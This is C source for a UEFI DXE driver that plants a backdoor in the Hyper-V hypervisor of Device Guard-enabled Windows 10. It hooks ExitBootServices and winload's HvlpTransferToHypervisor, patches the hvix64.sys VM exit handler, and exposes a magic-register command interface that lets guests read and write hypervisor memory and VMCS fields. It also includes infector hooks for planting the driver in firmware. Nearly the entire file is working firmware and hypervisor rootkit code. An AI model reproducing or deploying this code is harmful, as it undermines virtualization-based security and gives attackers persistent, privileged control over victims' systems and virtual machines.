/*
 *********************************************************************
  
  UEFI DXE driver that injects Hyper-V VM exit handler backdoor into 
  the Device Guard enabled Windows 10 Enterprise.
  
  Execution starts from new_ExitBootServices() -- a hook handler 
  for EFI_BOOT_SERVICES.ExitBootServices() which being called by
  winload!OslFwpKernelSetupPhase1(). After DXE phase exit winload.efi
  transfers exeution to previously loaded Hyper-V kernel (hvix64.sys)
  by calling winload!HvlpTransferToHypervisor().
  
  To transfer execution to Hyper-V winload.efi uses a special stub
  hvloader!HvlpLowMemoryStub() copied to reserved memory page at constant
  address 0x2000. During runtime phase this memory page is visible to
  hypervisor core at the same virtual and physical address and has 
  executable permissions which makes it a perfect place to store our 
  Hyper-V backdoor code.
  
  VMExitHandler() is a hook handler for VM exit function of hypervisor 
  core, it might be used for interaction between hypervisor backdoor and
  guest virtual machines.
  
  @d_olex

 *********************************************************************
 */

#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/DevicePathLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/SynchronizationLib.h>

#include <IndustryStandard/PeImage.h>

#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"

#include "../config.h"
#include "../backdoor_client.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "DmaBackdoorHv.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

#define JUMP32_LEN 5

// destination from operand
#define JUMP32_ADDR(_addr_) ((UINTN)(_addr_) + *(INT32 *)((UINT8 *)(_addr_) + 1) + JUMP32_LEN)

// destination to operand
#define JUMP32_OP(_from_, _to_) ((UINT32)((UINTN)(_to_) - (UINTN)(_from_) - JUMP32_LEN))


EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
); 

EFI_STATUS
EFIAPI
BackdoorEntryInfected(
    EFI_GUID *Protocol, VOID *Registration, VOID **Interface
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryInfected,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0
};

PINFECTOR_STATUS m_InfectorStatus = (PINFECTOR_STATUS)(STATUS_ADDR);

VOID *m_ImageBase = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
//--------------------------------------------------------------------------------------
void ConsolePrint(char *Message)
{
    UINTN Len = strlen(Message), i = 0;

    if (m_TextOutput)
    {        
        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }   
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {       
        EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Base; 

        // check for DOS header
        if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
            pDosHdr->e_lfanew < 0x100)
        {
            EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, pDosHdr->e_lfanew);

            // check for NT header
            if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
            {
                return Base;
            }
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *BackdoorImageRealocate(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;      

    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__"(): image size = 0x%x\r\n", 
        pHeaders->OptionalHeader.SizeOfImage
    );  

    // allocate memory for executable image
    Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
// magic value of winload!HvlpBelow1MbPage to patch by PatchBelow1MbPageAddr()
#define BELOW_1MB_PAGE_MAGIC 0x2db3d2288f108000

// offsets of VM exit handler code and data from the beginning of winload!HvlpBelow1MbPage
#define VM_EXIT_HANDLER_INFO 0x800
#define VM_EXIT_HANDLER_OLD  0xb00
#define VM_EXIT_HANDLER_CODE 0xb40

#define VM_EXIT_HOOK_SIZE 13

#define VM_F_EPT_COLLECT 0x01

typedef struct _VM_EXIT_INFO
{
    UINT64 Flags;
    UINT64 VmExitCounter;
    EPT_INFO EptList[EPT_MAX_COUNT];

} VM_EXIT_INFO,
*PVM_EXIT_INFO;

/*
    Guest state saved by VM exit handler of hvix64.sys:

        .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
        .text:FFFFF8000023A123      xor     ecx, ecx
        .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
        .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
        .text:FFFFF8000023A12F      mov     [rcx], rax
        .text:FFFFF8000023A132      mov     [rcx+8], rcx
        .text:FFFFF8000023A136      mov     [rcx+10h], rdx
        .text:FFFFF8000023A13A      mov     [rcx+18h], rbx
        .text:FFFFF8000023A13E      mov     [rcx+28h], rbp
        .text:FFFFF8000023A142      mov     [rcx+30h], rsi
        .text:FFFFF8000023A146      mov     [rcx+38h], rdi
        .text:FFFFF8000023A14A      mov     [rcx+40h], r8
        .text:FFFFF8000023A14E      mov     [rcx+48h], r9
        .text:FFFFF8000023A152      mov     [rcx+50h], r10
        .text:FFFFF8000023A156      mov     [rcx+58h], r11
        .text:FFFFF8000023A15A      mov     [rcx+60h], r12
        .text:FFFFF8000023A15E      mov     [rcx+68h], r13
        .text:FFFFF8000023A162      mov     [rcx+70h], r14
        .text:FFFFF8000023A166      mov     [rcx+78h], r15
*/
typedef struct _VM_GUEST_STATE
{
    UINT64 Rax;
    UINT64 Rcx;
    UINT64 Rdx;
    UINT64 Rbx;
    UINT64 Rsp;
    UINT64 Rbp;
    UINT64 Rsi;
    UINT64 Rdi;
    UINT64 R8;
    UINT64 R9;
    UINT64 R10;
    UINT64 R11;
    UINT64 R12;
    UINT64 R13;
    UINT64 R14;
    UINT64 R15;

} VM_GUEST_STATE,
*PVM_GUEST_STATE;

typedef VOID (EFIAPI * func_VMExitHandler)(
    VM_GUEST_STATE *Context, 
    UINT64 a2, UINT64 a3, UINT64 a4
);

VOID VMExitHandler(VM_GUEST_STATE *Context, UINT64 a2, UINT64 a3, UINT64 a4)
{
    // this value will be patched by PatchBelow1MbPageAddr()
    UINT8 *Below1MbPage = (UINT8 *)BELOW_1MB_PAGE_MAGIC;

    VM_EXIT_INFO *Info = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
    func_VMExitHandler old_VMExitHandler = (func_VMExitHandler)(Below1MbPage + VM_EXIT_HANDLER_OLD);

    // check for request from the client
    if (Context->R10 == HVBD_VM_EXIT_MAGIC)
    {        
        EFI_STATUS Status = EFI_INVALID_PARAMETER;        

        UINT64 Code = Context->R11;
        UINT64 *Arg0 = &Context->R12;
        UINT64 *Arg1 = &Context->R13;
        UINT64 *Arg2 = &Context->R14;

        if (Code == HVBD_C_INFO)
        {
            // return hypervisor CR0, CR3 and CR4 values
            *Arg0 = __readcr0();
            *Arg1 = __readcr3();
            *Arg2 = __readcr4();

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INFO_EX)
        {
            *Arg0 = *Arg1 = 0;            

            // return hypervisor IDTR
            __sidt(Arg0);

            // return hypervisor GS segment base
            *Arg2 = __readgsqword(0);            

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INFO_EX2)
        {
            // return VM exit handler information            
            *Arg1 = Info->VmExitCounter;
            *Arg0 = *(UINT64 *)(Below1MbPage + VM_EXIT_HANDLER_OLD + VM_EXIT_HOOK_SIZE + 2) - \
                                VM_EXIT_HOOK_SIZE;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VIRT_READ)
        {
            // read virtual memory qword
            *Arg1 = *(UINT64 *)*Arg0;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VIRT_WRITE)
        {
            // write virtual memory qword
            *(UINT64 *)*Arg0 = *Arg1;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VMREAD)
        {
            // read VMCS value
            __vmx_vmread(*Arg0, Arg1);

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_VMWRITE)
        {
            // write VMCS value
            __vmx_vmwrite(*Arg0, *Arg1);

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_EPT_GET_START)
        {
            __stosb(&Info->EptList, 0xff, EPT_MAX_COUNT * sizeof(EPT_INFO));

            Info->Flags |= VM_F_EPT_COLLECT;

            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_EPT_GET_STOP)
        {
            *Arg0 = (UINT64)&Info->EptList;
            *Arg1 = EPT_MAX_COUNT;

            Info->Flags &= ~VM_F_EPT_COLLECT;
                
            Status = EFI_SUCCESS;
        }
        else if (Code == HVBD_C_INVL_CACHES)
        {
            // invalidate processor caches
            __wbinvd();

            // flush TLB
            __writecr3(__readcr3());

            Status = EFI_SUCCESS;
        }

        // report status code to the client
        Context->R10 = Status;
    }    

    if (Info->Flags & VM_F_EPT_COLLECT)
    {
        UINTN i = 0;
        UINT64 EptAddr = 0;

        // read EPT address from the current VMCS
        __vmx_vmread(0x0000201A, &EptAddr);

        for (i = 0; i < EPT_MAX_COUNT; i += 1)
        {
            EPT_INFO *Entry = &Info->EptList[i];

            if (Entry->Addr == EPT_NONE)
            {
                Entry->Addr = EptAddr;

                // read VPID from the current VMCS
                __vmx_vmread(0x00000000, &Entry->Vpid);

                break;   
            }
            else if (Entry->Addr == EptAddr)
            {
                break;
            }
        }
    }

    Info->VmExitCounter += 1;

    // call original function
    old_VMExitHandler(Context, a2, a3, a4);
}

VOID *VMExitHandler_end(VOID) { return (VOID *)&VMExitHandler; }

VOID new_HvlpTransferToHypervisor(VOID *HvPageTable, VOID *HvEntry, VOID *HvlpLowMemoryStub)
{
    // this value will be patched by PatchBelow1MbPageAddr()
    UINT8 *Below1MbPage = (UINT8 *)BELOW_1MB_PAGE_MAGIC;

    HV_INFO *Info = (HV_INFO *)HV_INFO_ADDR;
    UINT64 PageTable = __readcr3();
    UINTN p = 0;

    Info->WinloadPageTable = PageTable;
    Info->HvPageTable = (UINT64)HvPageTable;
    Info->HvEntry = (UINT64)HvEntry;     

    while (p < 0x10000)
    {
        UINT8 *Func = (UINT8 *)HvEntry + p, m = 0;          

        __writecr3(HvPageTable);

        /*
            Match hvix64.sys VM exit handler code signature:

                .text:FFFFF8000023A11E      mov     [rsp+arg_20], rcx
                .text:FFFFF8000023A123      xor     ecx, ecx
                .text:FFFFF8000023A125      mov     [rsp+arg_28], rcx
                .text:FFFFF8000023A12A      mov     rcx, [rsp+arg_18]
                .text:FFFFF8000023A12F      mov     [rcx], rax
                .text:FFFFF8000023A132      mov     [rcx+8], rcx

                ...

                .text:FFFFF8000023A166      mov     [rcx+78h], r15

                ...

                .text:FFFFF8000023A1A4      call    _vmentry_handle
        */
        m = *(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x89 && *(Func + 0x02) == 0x4c && *(Func + 0x03) == 0x24 &&
            *(Func + 0x11) == 0x48 && *(Func + 0x12) == 0x89 && *(Func + 0x13) == 0x01 && 
            *(Func + 0x14) == 0x48 && *(Func + 0x15) == 0x89 && *(Func + 0x16) == 0x49 && *(Func + 0x17) == 0x08 &&
            *(Func + 0x48) == 0x4c && *(Func + 0x49) == 0x89 && *(Func + 0x4a) == 0x79 && *(Func + 0x4b) == 0x78 &&
            *(Func + 0x86) == 0xe8;

        __writecr3(PageTable);

        if (m)
        {
            UINT8 *Buff = Below1MbPage + VM_EXIT_HANDLER_OLD;

            __writecr3(HvPageTable);

            // get calee address
            Func = (UINT8 *)JUMP32_ADDR(Func + 0x86);

            __writecr3(PageTable);

            Info->HvVmExit = (UINT64)Func;

            /*
                Set up hook on hvix64.sys VM exit handler
            */

            __writecr3(HvPageTable);

            // save original bytes of VM exit handler
            __movsb(Buff, Func, VM_EXIT_HOOK_SIZE);

            __writecr3(PageTable);

            // mov rax, addr
            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE) = 0xb848;
            *(UINT64 *)(Buff + VM_EXIT_HOOK_SIZE + 2) = (UINT64)(Func + VM_EXIT_HOOK_SIZE);

            // jmp rax ; from callgate to function
            *(UINT16 *)(Buff + VM_EXIT_HOOK_SIZE + 10) = 0xe0ff;

            __writecr3(HvPageTable);

            // mov rax, addr
            *(UINT16 *)Func = 0xb848;
            *(UINT64 *)(Func + 2) = (UINT64)(Below1MbPage + VM_EXIT_HANDLER_CODE);

            // jmp rax ; from function to callgate
            *(UINT16 *)(Func + 10) = 0xe0ff;

            __writecr3(PageTable);

            break;
        }

        p += 1;
    }

    Info->Success += 1;
}

VOID *new_HvlpTransferToHypervisor_end(VOID) { return (VOID *)&new_HvlpTransferToHypervisor; } 
//--------------------------------------------------------------------------------------
#define WINLOAD_HOOK_SIZE JUMP32_LEN
#define WINLOAD_HOOK_BUFF WINLOAD_HOOK_SIZE * 2

// original address of hooked function
EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;

// return address to ExitBootServices() caller
VOID *ret_ExitBootServices = NULL;

void PatchBelow1MbPageAddr(UINT8 *Buff, UINTN BuffSize, VOID *Value)
{
    UINTN i = 0;

    for (i = 0; i < BuffSize - sizeof(UINT64); i += 1)
    {
        UINT64 Val = *(UINT64 *)(Buff + i);

        // check for magic value
        if ((Val & 0xfffffffffffff000) == BELOW_1MB_PAGE_MAGIC)
        {
            Val = (UINT64)Value + (Val & 0xfff);

            // update HvlpBelow1MbPage value
            *(UINT64 *)(Buff + i) = Val;
        }
    }
}

EFI_STATUS EFIAPI new_ExitBootServices(
    EFI_HANDLE ImageHandle,
    UINTN Key)
{    
    UINTN i = 0;
    EFI_IMAGE_NT_HEADERS *pHeaders = NULL;    

    VOID **HvlpBelow1MbPage = NULL;
    UINT8 *HvlpBelow1MbPageAllocated = NULL;    

    HV_INFO *HvInfo = (HV_INFO *)HV_INFO_ADDR;

    // return address points to winload
    VOID *Base = NULL, *Addr = (VOID *)((UINTN)ret_ExitBootServices & 0xfffffffffffff000);

    // determinate winload.efi base address
    while (i < PAGE_SIZE * 0x20)
    {
        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
        {
            Base = Addr;
            break;
        }

        Addr = (VOID *)((UINTN)Addr - PAGE_SIZE);
        i += PAGE_SIZE;
    }    

    if (Base == NULL)
    {
        HvInfo->Success = (UINT64)-1;
        goto _end;
    }    

    pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, ((EFI_IMAGE_DOS_HEADER *)Base)->e_lfanew);

    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
    {
        UINT8 *Code = RVATOVA(Base, i);

        /*
            Match winload!HvlpLaunchHvLoader() code signature:

                .text:000000014000F307      mov     cs:HvlpBelow1MbPageAllocated, al
                .text:000000014000F30D      mov     rax, [rdi+10h]
                .text:000000014000F311      mov     cs:HvlpBelow1MbPage, rax
                .text:000000014000F318      mov     [rsp+0C8h+var_A8], r13d
                .text:000000014000F31D      call    BlMmMapPhysicalAddressEx

        */
        if (*(UINT32 *)(Code + 0x06) == 0x10478b48 && /* mov rax, [rdi+10h] */
            *(Code + 0x00) == 0x88 && *(Code + 0x01) == 0x05 && /* mov HvlpBelow1MbPageAllocated, al */            
            *(Code + 0x0a) == 0x48 && *(Code + 0x0b) == 0x89 && *(Code + 0x0c) == 0x05 && /* mov HvlpBelow1MbPage, rax */
            *(Code + 0x11) == 0x44 && *(Code + 0x12) == 0x89 && /* mov [rsp+XX], r13d */
            *(Code + 0x16) == 0xe8) /* call BlMmMapPhysicalAddressEx */
        {
            // get mov instructions operands
            HvlpBelow1MbPage = (VOID **)((UINTN)(Code + 0x11) + *(INT32 *)(Code + 0x0d));
            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x06) + *(INT32 *)(Code + 0x02));            
            break;
        }
    }

    if (HvlpBelow1MbPage == NULL || HvlpBelow1MbPageAllocated == NULL)
    {
        HvInfo->Success = (UINT64)-2;
        goto _end;
    }

    if (*HvlpBelow1MbPageAllocated == 0)
    {
        HvInfo->Success = (UINT64)-3;
        goto _end;
    }

    DbgMsg(__FILE__, __LINE__, "winload.efi is at "FPTR"\r\n", Base);    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Return address is "FPTR"\r\n", ret_ExitBootServices);

    DbgMsg(
        __FILE__, __LINE__, "winload!HvlpBelow1MbPage is at "FPTR" (value = "FPTR")\r\n", 
        HvlpBelow1MbPage, *HvlpBelow1MbPage
    );

    DbgMsg(
        __FILE__, __LINE__, "winload!HvlpBelow1MbPageAllocated is at "FPTR" (value = %d)\r\n", 
        HvlpBelow1MbPageAllocated, *HvlpBelow1MbPageAllocated
    );    

    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
    {
        UINT8 *Func = RVATOVA(Base, i);

        /*
            Match winload!HvlpTransferToHypervisor() code signature:

                .text:0000000140109270      push    rbx
                .text:0000000140109272      push    rbp
                .text:0000000140109273      push    rsi
                .text:0000000140109274      push    rdi
                .text:0000000140109275      push    r12
                .text:0000000140109277      push    r13
                .text:0000000140109279      push    r14
                .text:000000014010927B      push    r15
                .text:000000014010927D      mov     cs:HvlpSavedRsp, rsp
                .text:0000000140109284      jmp     r8

        */
        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x53 && /* push rbx */
            *(Func + 0x02) == 0x55 && *(Func + 0x03) == 0x56 && /* push rbp && push rsi */
            *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x25 && /* mov HvlpSavedRsp, rsp */
            *(Func + 0x14) == 0x41 && *(Func + 0x15) == 0xff && *(Func + 0x16) == 0xe0) /* jmp r8 */
            
        {
            UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
            UINTN CodeSize = 0;

            // use HvlpBelow1MbPage + 0x10 to store hook handler code
            UINT8 *Buff = Below1MbPage + 0x10;
            UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + (JUMP32_LEN * 2) + 16;

            UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
            VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
            
            DbgMsg(__FILE__, __LINE__, "winload!HvlpTransferToHypervisor is at "FPTR"\r\n", Func);

            CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;

            // copy VM exit handler code to HvlpBelow1MbPage
            m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);

            // patch HvlpBelow1MbPage value in VMExitHandler() code
            PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);

            // clear VM exit handler info
            VmExitInfo->Flags = 0;
            VmExitInfo->VmExitCounter = 0;

            m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);

            /*
                Set up hook on winload!HvlpTransferToHypervisor()
            */

            CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;

            // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
            m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);

            // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
            PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);

            // push rcx / push rdx / push r8
            *(UINT32 *)Buff = 0x50415251;

            // push rbx / push rdi / push rsi
            *(UINT32 *)(Buff + 4) = 0x90565753;

            // call addr ; from callgate to handler            
            *(Buff + 8) = 0xe8;
            *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);

            // pop rsi / pop rdi / pop rbx
            *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;

            // pop r8 / pop rdx / pop rcx
            *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;

            // save original bytes
            m_BS->CopyMem(Buff + JUMP32_LEN + 16, Func, WINLOAD_HOOK_SIZE);

            // jmp addr ; from callgate to function
            *(UINT8 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE) = 0xe9;
            *(UINT32 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE + 1) = \
                JUMP32_OP(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE, Func + WINLOAD_HOOK_SIZE);

            // jmp addr ; from function to callgate
            *Func = 0xe9;
            *(UINT32 *)(Func + 1) = JUMP32_OP(Func, Buff);            

            DbgMsg(
                __FILE__, __LINE__, 
                "winload!HvlpTransferToHypervisor() hook was set (handler = "FPTR")\r\n",
                Buff
            );

            goto _end;
        }
    }

    DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpTransferToHypervisor()\r\n");

    HvInfo->Success = (UINT64)-4;

_end:

    // exit to the original function
    return old_ExitBootServices(ImageHandle, Key);
}
//--------------------------------------------------------------------------------------
typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

VOID BackdoorEntryResident(VOID *Image)
{   
    m_ImageBase = Image;        

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // hook EFI_BOOT_SERVICES.ExitBootServices()
    old_ExitBootServices = m_BS->ExitBootServices;
    m_BS->ExitBootServices = _ExitBootServices;

    DbgMsg(
        __FILE__, __LINE__, 
        "EFI_BOOT_SERVICES.ExitBootServices() hook was set (handler = "FPTR")\r\n",
        _ExitBootServices
    );

    m_InfectorStatus->Success += 1;
}
//--------------------------------------------------------------------------------------
EFI_STATUS
EFIAPI
BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;

    // get backdoor image base address
    VOID *Base = ImageBaseByAddress(get_addr());
    if (Base == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    // remove LocateProtocol() hook
    SystemTable->BootServices->LocateProtocol = LocateProtocol;

    // call real entry point
    _ModuleEntryPoint(NULL, SystemTable);    

    // call hooked function
    return LocateProtocol(Protocol, Registration, Interface);
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable) 
{
    EFI_STATUS Status = EFI_SUCCESS;    
    VOID *Image = NULL;

    m_BS = SystemTable->BootServices;

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif        

#if defined(BACKDOOR_DEBUG)

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        SystemTable->ConsoleOutHandle,
        &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  Hyper-V backdoor loaded     \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

    DbgMsg(
        __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
        m_ImageBase
    );

#endif // BACKDOOR_DEBUG    

    // copy image to the new location
    if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
    {
        BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
            Image,
            (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
        );
        
        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
        
        // initialize backdoor resident code
        pEntry(Image);
    } 

#if defined(BACKDOOR_DEBUG)

    m_BS->Stall(TO_MICROSECONDS(3));

#endif

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF

